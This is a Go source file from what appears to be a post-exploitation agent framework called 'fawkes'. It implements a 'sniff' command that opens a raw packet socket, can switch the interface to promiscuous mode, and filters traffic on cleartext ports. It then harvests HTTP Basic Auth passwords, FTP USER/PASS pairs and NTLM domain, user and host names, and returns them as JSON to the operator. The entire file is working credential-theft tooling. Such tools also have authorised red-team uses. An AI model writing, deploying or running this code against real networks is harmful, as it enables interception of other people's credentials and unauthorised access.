//go:build linux

package commands

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/unix"
)

type SniffCommand struct{}

func (c *SniffCommand) Name() string        { return "sniff" }
func (c *SniffCommand) Description() string { return "Passive network sniffing for credential capture (T1040)" }

type sniffParams struct {
	Interface   string `json:"interface"`
	Duration    int    `json:"duration"`
	MaxBytes    int64  `json:"max_bytes"`
	Ports       string `json:"ports"`
	Promiscuous bool   `json:"promiscuous"`
}

type sniffCredential struct {
	Protocol  string `json:"protocol"`
	SrcIP     string `json:"src_ip"`
	SrcPort   uint16 `json:"src_port"`
	DstIP     string `json:"dst_ip"`
	DstPort   uint16 `json:"dst_port"`
	Username  string `json:"username"`
	Password  string `json:"password,omitempty"`
	Detail    string `json:"detail,omitempty"`
	Timestamp int64  `json:"timestamp"`
}

type sniffResult struct {
	Duration      string             `json:"duration"`
	PacketCount   int                `json:"packet_count"`
	BytesCaptured int64              `json:"bytes_captured"`
	Credentials   []*sniffCredential `json:"credentials"`
	Errors        []string           `json:"errors,omitempty"`
}

func sniffHtons(i uint16) uint16 {
	return (i<<8)&0xff00 | i>>8
}

type packetMeta struct {
	SrcIP   string
	DstIP   string
	SrcPort uint16
	DstPort uint16
}

func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
	var params sniffParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.Duration <= 0 {
		params.Duration = 30
	}
	if params.Duration > 300 {
		params.Duration = 300 // Cap at 5 minutes
	}
	if params.MaxBytes <= 0 {
		params.MaxBytes = 50 * 1024 * 1024 // 50MB
	}

	// Parse port filter
	var ports []uint16
	if params.Ports != "" {
		for _, p := range strings.Split(params.Ports, ",") {
			p = strings.TrimSpace(p)
			var port int
			if _, err := fmt.Sscanf(p, "%d", &port); err == nil && port > 0 && port < 65536 {
				ports = append(ports, uint16(port))
			}
		}
	}
	if len(ports) == 0 {
		// Default: common cleartext protocol ports
		ports = []uint16{21, 80, 110, 143, 389, 445, 8080}
	}

	// Create raw socket
	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(sniffHtons(unix.ETH_P_IP)))
	if err != nil {
		return errorf("Failed to create raw socket (need root/CAP_NET_RAW): %v", err)
	}
	defer unix.Close(fd)

	result := &sniffResult{}

	// Bind to interface if specified
	if params.Interface != "" {
		iface, ifErr := net.InterfaceByName(params.Interface)
		if ifErr != nil {
			return errorf("Interface %q not found: %v", params.Interface, ifErr)
		}

		sll := unix.SockaddrLinklayer{
			Protocol: sniffHtons(unix.ETH_P_IP),
			Ifindex:  iface.Index,
		}
		if bindErr := unix.Bind(fd, &sll); bindErr != nil {
			return errorf("Bind to %q failed: %v", params.Interface, bindErr)
		}

		if params.Promiscuous {
			mreq := unix.PacketMreq{
				Ifindex: int32(iface.Index),
				Type:    unix.PACKET_MR_PROMISC,
			}
			if promErr := unix.SetsockoptPacketMreq(fd, unix.SOL_PACKET, unix.PACKET_ADD_MEMBERSHIP, &mreq); promErr != nil {
				result.Errors = append(result.Errors, fmt.Sprintf("promiscuous mode failed: %v", promErr))
			} else {
				defer func() {
					_ = unix.SetsockoptPacketMreq(fd, unix.SOL_PACKET, unix.PACKET_DROP_MEMBERSHIP, &unix.PacketMreq{
						Ifindex: int32(iface.Index),
						Type:    unix.PACKET_MR_PROMISC,
					})
				}()
			}
		}
	}

	// Apply BPF filter
	bpfFilter := sniffBuildTCPFilter(ports)
	if bpfErr := sniffAttachBPF(fd, bpfFilter); bpfErr != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("BPF filter failed: %v", bpfErr))
	}

	// Socket read timeout (1s intervals for deadline checking)
	tv := unix.Timeval{Sec: 1, Usec: 0}
	_ = unix.SetsockoptTimeval(fd, unix.SOL_SOCKET, unix.SO_RCVTIMEO, &tv)

	// Capture
	ftpTracker := &sniffFTPTracker{pending: make(map[string]string)}
	deadline := time.Now().Add(time.Duration(params.Duration) * time.Second)
	startTime := time.Now()
	buf := make([]byte, 65536)

	for !task.DidStop() && time.Now().Before(deadline) && result.BytesCaptured < params.MaxBytes {
		n, _, recvErr := unix.Recvfrom(fd, buf, 0)
		if recvErr != nil {
			if recvErr == unix.EAGAIN || recvErr == unix.EWOULDBLOCK || recvErr == unix.EINTR {
				continue
			}
			result.Errors = append(result.Errors, fmt.Sprintf("recvfrom: %v", recvErr))
			break
		}
		if n == 0 {
			continue
		}

		result.PacketCount++
		result.BytesCaptured += int64(n)
		packet := buf[:n]

		// Parse: Ethernet → IPv4 → TCP → payload
		if len(packet) < 14 {
			continue
		}
		etherType := binary.BigEndian.Uint16(packet[12:14])
		if etherType != 0x0800 {
			continue
		}
		ipData := packet[14:]

		if len(ipData) < 20 {
			continue
		}
		ihl := int(ipData[0]&0x0F) * 4
		if ihl < 20 || ihl > len(ipData) {
			continue
		}
		if ipData[9] != 6 { // TCP only
			continue
		}
		totalLen := int(binary.BigEndian.Uint16(ipData[2:4]))
		if totalLen > len(ipData) {
			totalLen = len(ipData)
		}

		meta := packetMeta{
			SrcIP: net.IP(ipData[12:16]).String(),
			DstIP: net.IP(ipData[16:20]).String(),
		}
		tcpData := ipData[ihl:totalLen]

		if len(tcpData) < 20 {
			continue
		}
		meta.SrcPort = binary.BigEndian.Uint16(tcpData[0:2])
		meta.DstPort = binary.BigEndian.Uint16(tcpData[2:4])
		dataOff := int(tcpData[12]>>4) * 4
		if dataOff < 20 || dataOff > len(tcpData) {
			continue
		}
		payload := tcpData[dataOff:]
		if len(payload) == 0 {
			continue
		}

		// Extract credentials
		if cred := sniffExtractHTTPBasicAuth(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
		if meta.DstPort == 21 || meta.SrcPort == 21 {
			if cred := ftpTracker.process(payload, &meta); cred != nil {
				result.Credentials = append(result.Credentials, cred)
			}
		}
		if cred := sniffExtractNTLM(payload, &meta); cred != nil {
			result.Credentials = append(result.Credentials, cred)
		}
	}

	result.Duration = time.Since(startTime).Truncate(time.Second).String()

	// Format output
	output, _ := json.Marshal(result)
	return successResult(string(output))
}

// BPF filter: accept TCP packets on specified ports (both src and dst)
func sniffBuildTCPFilter(ports []uint16) []unix.SockFilter {
	if len(ports) == 0 {
		return []unix.SockFilter{
			{Code: 0x28, K: 12},                        // Load EtherType
			{Code: 0x15, Jt: 0, Jf: 3, K: 0x0800},     // IPv4?
			{Code: 0x30, K: 23},                         // Load IP protocol
			{Code: 0x15, Jt: 0, Jf: 1, K: 6},           // TCP?
			{Code: 0x06, K: 0xFFFFFFFF},                 // Accept
			{Code: 0x06, K: 0},                          // Reject
		}
	}

	// Build filter checking both dst and src ports
	np := uint8(len(ports))
	// Total layout: 4 preamble + 1 load_dst + np dst_checks + 1 load_src + np src_checks + reject + accept
	total := 4 + 1 + int(np) + 1 + int(np) + 2
	acceptOff := total - 1

	var f []unix.SockFilter
	// [0] Load EtherType
	f = append(f, unix.SockFilter{Code: 0x28, K: 12})
	// [1] IPv4?
	f = append(f, unix.SockFilter{Code: 0x15, Jt: 0, Jf: uint8(total - 2 - 1), K: 0x0800})
	// [2] Load IP protocol
	f = append(f, unix.SockFilter{Code: 0x30, K: 23})
	// [3] TCP?
	f = append(f, unix.SockFilter{Code: 0x15, Jt: 0, Jf: uint8(total - 4 - 1), K: 6})

	// [4] Load TCP dst port (offset 36 = 14 eth + 20 ip + 2)
	f = append(f, unix.SockFilter{Code: 0x28, K: 36})

	// [5..5+np-1] Check dst port
	for i := uint8(0); i < np; i++ {
		curIdx := 5 + int(i)
		jt := uint8(acceptOff - curIdx - 1)
		jf := uint8(0)
		f = append(f, unix.SockFilter{Code: 0x15, Jt: jt, Jf: jf, K: uint32(ports[i])})
	}

	// [5+np] Load TCP src port (offset 34)
	f = append(f, unix.SockFilter{Code: 0x28, K: 34})

	// [5+np+1..5+2np] Check src port
	for i := uint8(0); i < np; i++ {
		curIdx := 5 + int(np) + 1 + int(i)
		jt := uint8(acceptOff - curIdx - 1)
		jf := uint8(0)
		f = append(f, unix.SockFilter{Code: 0x15, Jt: jt, Jf: jf, K: uint32(ports[i])})
	}

	// Reject
	f = append(f, unix.SockFilter{Code: 0x06, K: 0})
	// Accept
	f = append(f, unix.SockFilter{Code: 0x06, K: 0xFFFFFFFF})

	return f
}

func sniffAttachBPF(fd int, filter []unix.SockFilter) error {
	prog := unix.SockFprog{
		Len:    uint16(len(filter)),
		Filter: &filter[0],
	}
	_, _, errno := unix.Syscall6(
		unix.SYS_SETSOCKOPT,
		uintptr(fd),
		uintptr(unix.SOL_SOCKET),
		uintptr(unix.SO_ATTACH_FILTER),
		uintptr(unsafe.Pointer(&prog)),
		uintptr(unsafe.Sizeof(prog)),
		0,
	)
	if errno != 0 {
		return fmt.Errorf("SO_ATTACH_FILTER: %v", errno)
	}
	return nil
}

// HTTP Basic Auth extraction
func sniffExtractHTTPBasicAuth(payload []byte, meta *packetMeta) *sniffCredential {
	s := string(payload)
	if len(s) < 4 {
		return nil
	}
	// Quick check for HTTP request
	if s[0] != 'G' && s[0] != 'P' && s[0] != 'H' && s[0] != 'D' && s[0] != 'O' {
		return nil
	}

	idx := strings.Index(strings.ToLower(s), "authorization: basic ")
	if idx < 0 {
		return nil
	}

	start := idx + len("authorization: basic ")
	rest := s[start:]
	end := strings.Index(rest, "\r\n")
	if end < 0 {
		end = len(rest)
	}
	encoded := strings.TrimSpace(rest[:end])

	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		decoded, err = base64.RawStdEncoding.DecodeString(encoded)
		if err != nil {
			return nil
		}
	}

	parts := strings.SplitN(string(decoded), ":", 2)
	if len(parts) != 2 {
		return nil
	}

	return &sniffCredential{
		Protocol:  "http-basic",
		SrcIP:     meta.SrcIP,
		SrcPort:   meta.SrcPort,
		DstIP:     meta.DstIP,
		DstPort:   meta.DstPort,
		Username:  parts[0],
		Password:  parts[1],
		Timestamp: time.Now().Unix(),
	}
}

// FTP credential tracking (USER + PASS correlation)
type sniffFTPTracker struct {
	mu      sync.Mutex
	pending map[string]string
}

func (ft *sniffFTPTracker) process(payload []byte, meta *packetMeta) *sniffCredential {
	s := strings.TrimSpace(string(payload))
	if len(s) == 0 || len(s) > 512 {
		return nil
	}

	key := fmt.Sprintf("%s:%d->%s:%d", meta.SrcIP, meta.SrcPort, meta.DstIP, meta.DstPort)
	upper := strings.ToUpper(s)

	ft.mu.Lock()
	defer ft.mu.Unlock()

	if strings.HasPrefix(upper, "USER ") {
		username := strings.TrimSpace(s[5:])
		if username != "" && username != "anonymous" {
			ft.pending[key] = username
		}
		return nil
	}

	if strings.HasPrefix(upper, "PASS ") {
		password := strings.TrimSpace(s[5:])
		if username, ok := ft.pending[key]; ok {
			delete(ft.pending, key)
			return &sniffCredential{
				Protocol:  "ftp",
				SrcIP:     meta.SrcIP,
				SrcPort:   meta.SrcPort,
				DstIP:     meta.DstIP,
				DstPort:   meta.DstPort,
				Username:  username,
				Password:  password,
				Timestamp: time.Now().Unix(),
			}
		}
	}

	return nil
}

// NTLM detection — extracts domain\user from Type 3 Authenticate messages
var sniffNTLMSig = []byte("NTLMSSP\x00")

func sniffExtractNTLM(payload []byte, meta *packetMeta) *sniffCredential {
	idx := bytes.Index(payload, sniffNTLMSig)
	if idx < 0 {
		return nil
	}

	data := payload[idx:]
	if len(data) < 72 {
		return nil
	}

	msgType := binary.LittleEndian.Uint32(data[8:12])
	if msgType != 3 {
		return nil
	}

	readField := func(lenOff, offOff int) string {
		if len(data) < offOff+4 {
			return ""
		}
		fLen := binary.LittleEndian.Uint16(data[lenOff : lenOff+2])
		fOff := binary.LittleEndian.Uint32(data[offOff : offOff+4])
		end := uint32(fLen) + fOff
		if fLen == 0 || end > uint32(len(data)) {
			return ""
		}
		return sniffDecodeUTF16LE(data[fOff:end])
	}

	domain := readField(28, 32)
	user := readField(36, 40)
	host := readField(44, 48)

	if user == "" {
		return nil
	}

	username := user
	if domain != "" {
		username = domain + "\\" + user
	}

	return &sniffCredential{
		Protocol:  "ntlm",
		SrcIP:     meta.SrcIP,
		SrcPort:   meta.SrcPort,
		DstIP:     meta.DstIP,
		DstPort:   meta.DstPort,
		Username:  username,
		Detail:    fmt.Sprintf("host=%s", host),
		Timestamp: time.Now().Unix(),
	}
}

func sniffDecodeUTF16LE(b []byte) string {
	if len(b) < 2 || len(b)%2 != 0 {
		return ""
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(b[i*2 : i*2+2])
	}
	return string(utf16.Decode(u16))
}
